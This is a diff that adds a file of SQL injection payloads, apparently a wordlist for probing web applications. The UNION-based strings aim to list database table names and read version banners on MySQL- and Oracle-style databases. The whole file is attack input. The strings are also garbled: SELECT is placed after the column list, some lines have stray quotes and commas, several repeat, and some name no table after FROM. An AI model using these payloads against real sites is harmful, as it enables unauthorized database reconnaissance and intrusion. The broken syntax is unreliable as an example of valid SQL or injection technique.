@@ -1,0 +1,35 @@
+'UNION table_name,NULL SELECT FROM information_schema.tables--",
+'UNION NULL,table_name SELECT FROM information_schema.tables--",
+'UNION table_name,NULL SELECT FROM information_schema.tables #",	
+'UNION NULL,table_name SELECT FROM information_schema.tables #",	
+'UNION table_name,NULL SELECT FROM information_schema.tables--",	
+'UNION NULL,table_name SELECT FROM information_schema.tables--",	
+'UNION table_name,NULL,NULL SELECT FROM information_schema.tables--",	
+'UNION NULL,table_name,NULL SELECT FROM information_schema.tables--"
+'UNION NULL,NULL,table_name SELECT FROM information_schema.tables--
+'UNION table_name,NULL,NULL SELECT FROM information_schema.tables#
+'UNION NULL,table_name,NULL SELECT FROM information_schema.tables#
+'UNION NULL,NULL,table_name SELECT FROM information_schema.tables#
+'UNION * SELECT FROM information_schema.tables--
+'UNION NULL,NULL SELECT FROM version()--
+'UNION TABLE_NAME,NULL SELECT FROM ALL_TABLES --
+'UNION NULL,NULL SELECT FROM version()--
+'UNION NULL,TABLE_NAME SELECT FROM ALL_TABLES--
+'UNION NULL,banner SELECT FROM v$version--
+'UNION banner,NULL SELECT FROM v$version--
+'UNION NULL,NULL SELECT FROM --
+'UNION NULL,NULL SELECT FROM #
+'UNION version,NULL SELECT FROM v$instance--
+'UNION NULL,version SELECT FROM v$instance--
+'UNION NULL,NULL SELECT FROM DUAL --
+'UNION NULL,NULL,NULL SELECT FROM --	
+'UNION TABLE_NAME,NULL,NULL SELECT FROM  DUAL--
+'UNION NULL,TABLE_NAME SELECT FROM ALL_TABLES--
+'UNION TABLE_NAME,NULL SELECT FROM ALL_TABLES--
+'UNION NULL,NULL,NULL SELECT FROM #
+'UNION NULL,TABLE_NAME,NULL SELECT FROM DUAL --
+'UNION NULL,NULL,TABLE_NAME SELECT FROM DUAL --
+'UNION NULL,NULL,NULL SELECT FROM #
+'UNION banner,NULL,NULL SELECT FROM v$version--
+'UNION NULL,banner,NULL SELECT FROM v$version--
+'UNION NULL,NULL,banner SELECT FROM v$version--
